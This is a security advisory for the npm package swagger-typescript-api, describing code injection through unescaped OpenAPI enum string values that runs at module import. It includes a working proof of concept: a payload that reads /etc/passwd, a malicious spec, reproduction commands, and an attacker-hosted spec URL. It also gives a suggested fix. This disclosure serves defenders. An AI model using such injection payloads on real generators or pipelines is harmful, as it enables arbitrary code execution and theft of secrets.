# [H] swagger-typescript-api vulnerable to code injection via unescaped enum string values

## Summary
Severity: High
Advisory: GHSA-5f94-x226-ccpm
CVE: CVE-2026-54664
CWE: CWE-1336, CWE-74, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-5f94-x226-ccpm
Type: github-advisory

## Affected
- npm: `swagger-typescript-api` — affected >=0 <13.12.2

## Details
### Summary

`swagger-typescript-api` interpolates `components.schemas.*.enum[i]` string values into the body of generated TypeScript `enum` declarations without escaping. A malicious enum value can close the enclosing string literal, terminate the enum body, and inject a bare-block IIFE that executes at **module load** the first time the generated client is imported. The trigger requires no instantiation and no method call — only an `import` of the generated module. The attacker controls the OpenAPI spec (remote `--url`, third-party / public spec, multi-tenant platform); the victim is whoever runs the generator and imports the result (the developer, their CI runner, or any downstream consumer of the generated package). Impact is arbitrary code execution with the importing process's privileges — read any file the importer can read, write any file, exfiltrate secrets, etc.

### Details

The root cause is `Ts.StringValue` in `src/configuration.ts:250`:

```ts
StringValue: (content: unknown) => `"${content}"`,
```

It wraps a value in double quotes with **zero escaping** — no handling of `"`, `\`, newlines, or anything else. The codebase's only escape function (`escapeJSDocContent` in `src/schema-parser/schema-formatters.ts:127`) only replaces `*/` and is never applied to this path.

Enum string values reach `Ts.StringValue` at `src/schema-parser/base-schema-parsers/enum.ts:100` and `:116`:

```ts
return this.config.Ts.StringValue(value);
// ...
value: this.config.Ts.StringValue(enumName),
```

The result is interpolated raw into the enum body in `templates/base/enum-data-contract.ejs` (default `enumStyle: "enum"` branch, lines 24-31):

```ejs
export enum <%~ name %> {
  <%~ _.map($content, ({ key, value, description }) => {
    ...
    return [
      formattedDescription && `/** ${formattedDescription} */`,
      `${key} = ${value}`
    ].filter(Boolean).join("\n");
  }).join(",\n") %>
}
```

Where `${value}` is the result of `Ts.StringValue` — raw `"${content}"`. An attacker-controlled enum value containing a `"` closes the string and exposes the surrounding code position to injection.

A `;}` sequence terminates the enum body mid-stream. A `{` opens a bare block at module top level. An async IIFE inside that block runs at module load. A trailing `//` consumes the closing `"` that `Ts.StringValue` still appends, and the template's own closing `}` of the enum becomes the closing `}` of the bare block. Resulting TypeScript parses cleanly, bundles cleanly through esbuild, and the IIFE fires on bare `await import('./generated.js')`.

The same `Ts.StringValue` function is also called from `src/schema-parser/schema-utils.ts:215,406`, `src/schema-parser/base-schema-parsers/object.ts:47`, and `src/schema-parser/base-schema-parsers/discriminator.ts:88,121,131,195`. Those other call sites currently land in type-level positions (interface/type bodies) where the breakout cannot reach runtime — they are safe **by accident of context**, not by escaping. A fix that hardens `Ts.StringValue` itself protects those sites too as defense in depth.

### PoC

Self-contained reproducer (`run.sh` runs end-to-end: install pinned package → generate from control + payload → bundle with esbuild → bare-import → check canary) is added in the comments. Tested on `swagger-typescript-api@13.12.1` and Node `v24.11.1`.

**Malicious enum value** (literal string, JSON-encoded in the spec below):

```
blue";}<NEWLINE>{(async()=>{ try { const fs=await import('node:fs'); const d=fs.readFileSync('/etc/passwd','utf8'); fs.writeFileSync('/tmp/sta_canary',d); } catch(e){} })();//
```

**Minimal payload spec:**

```json
{
  "openapi": "3.0.0",
  "info": { "title": "EnumPayloadAPI", "version": "1.0.0" },
  "components": {
    "schemas": {
      "Color": {
        "type": "string",
        "enum": [
          "red",
          "blue\";}\n{(async()=>{try{const fs=await import('node:fs');const d=fs.readFileSync('/etc/passwd','utf8');fs.writeFileSync('/tmp/sta_canary',d);}catch(e){}})();//"
        ]
      }
    }
  },
  "paths": {
    "/ping": {
      "get": {
        "operationId": "ping",
        "responses": {
          "200": {
            "description": "OK",
            "content": { "application/json": { "schema": { "$ref": "#/components/schemas/Color" } } }
          }
        }
      }
    }
  }
}
```

**Steps:**

```bash
npm install swagger-typescript-api@13.12.1 esbuild
node -e "import('swagger-typescript-api').then(m => m.generateApi({
  name: 'Api.ts', output: process.cwd() + '/out',
  input: process.cwd() + '/payload-spec.json', httpClientType: 'fetch'
}))"
npx esbuild out/Api.ts --bundle --format=esm --platform=node \
  --tsconfig-raw='{}' --outfile=out/Api.bundle.mjs
rm -f /tmp/sta_canary
node --input-type=module -e "await import('./out/Api.bundle.mjs'); await new Promise(r => setTimeout(r, 300));"
ls -la /tmp/sta_canary && cat /tmp/sta_canary
```

**Generated `out/Api.ts` (enum block — payload):**

```ts
    export enum Color {
  Red = "red",
  BlueAsyncTryConstFsAwaitImportNodeFsFs...CatchE = "blue";}
{(async()=>{try{const fs=await import('node:fs');const d=fs.readFileSync('/etc/passwd','utf8');fs.writeFileSync('/tmp/sta_canary',d);}catch(e){}})();//"
 }
```

The `;}` closes the enum body. The `{...}` after it is a bare block at module top level. The async IIFE runs at module load and fires the canary. esbuild parses this as valid TypeScript and bundles cleanly.

**Result:** after bare `import` of the bundle, `/tmp/sta_canary` contains the full `/etc/passwd` of the importing process (1470 bytes on a typical Linux host). Control spec (`"enum": ["red", "blue"]`) generates a clean enum and writes no canary.

### Impact

**Type:** Code injection in generated output (CWE-94) / template-engine injection (CWE-1336).

**Affected use cases:** any developer or pipeline that runs `swagger-typescript-api` against an OpenAPI spec they did not author entirely. Concrete scenarios:

- `sta generate --url https://attacker.example/openapi.json` — a public, third-party, or attacker-hosted spec.
- A CI/CD pipeline regenerating clients from a vendor / partner spec on each build.
- A multi-tenant SaaS that generates per-tenant clients from tenant-supplied specs.
- Any project pinned to a spec file that a contributor can modify via PR — the spec change is itself the exploit.

**Lifecycle:** the bare-block IIFE fires at **module load**. A consumer does not need to instantiate `HttpClient`, does not need to call any API method, does not need to use the enum value — they only need to `import` the generated module (or anything that transitively imports it, e.g. the `data-contracts.ts` file in modular mode). Importing a TypeScript types file is the absolute minimum interaction a consumer can have with a generated client, which makes this the highest-impact sink in the package.

**Privilege:** the IIFE runs with the full privileges of the importing process — read/write any file the process can access, network egress, environment-variable access, child-process spawn, etc.

**Suggested fix:** harden `Ts.StringValue` in `src/configuration.ts:250` to produce a properly-escaped JavaScript string literal — escape at minimum `"`, `\`, `\n`, `\r`, `\t`, `\b`, `\f`, `\v`, `\0`, and the line/paragraph separators `` / ``. `JSON.stringify` on the content is a one-line acceptable implementation. This single change also protects every other call site of `Ts.StringValue` (currently safe only by accident of landing in type-level positions).

Submitted by: Hamza Haroon (thegr1ffyn)

## References
- https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-5f94-x226-ccpm
- https://github.com/acacode/swagger-typescript-api/pull/1779
- https://github.com/acacode/swagger-typescript-api/commit/306d59acb8ffbb00f953f807b97234b21f51d9de
- https://github.com/acacode/swagger-typescript-api
- https://github.com/acacode/swagger-typescript-api/releases/tag/v13.12.2
